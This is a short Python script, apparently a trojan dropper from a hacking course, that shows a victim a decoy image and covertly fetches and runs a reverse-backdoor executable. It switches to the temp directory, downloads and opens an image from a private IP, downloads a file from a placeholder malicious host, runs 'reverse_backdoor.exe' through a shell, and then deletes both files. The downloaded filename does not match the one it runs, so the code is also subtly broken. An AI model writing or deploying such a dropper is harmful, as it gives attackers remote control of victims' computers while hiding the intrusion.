#!/usr/bin/env python

import subprocess
import os
import tempfile

import requests


def download(url):
    """
    Downloads a file from the specified URL.

    Args:
        url (str): The URL of the file to download.
    """
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)


def main():
    """
    Main function to execute the code.
    """
    # Change the current working directory to the temporary directory
    temp_directory = tempfile.gettempdir()
    os.chdir(temp_directory)

    # Download and open the image file
    download("http://10.0.2.26/files/image.jpg")
    subprocess.Popen("image.jpg", shell=True)

    # Download and execute the malicious file
    download("http://your-malicious-file.exe")
    subprocess.call("reverse_backdoor.exe", shell=True)

    # Remove the downloaded files
    os.remove("image.jpg")
    os.remove("reverse_backdoor.exe")


if __name__ == "__main__":
    main()
    
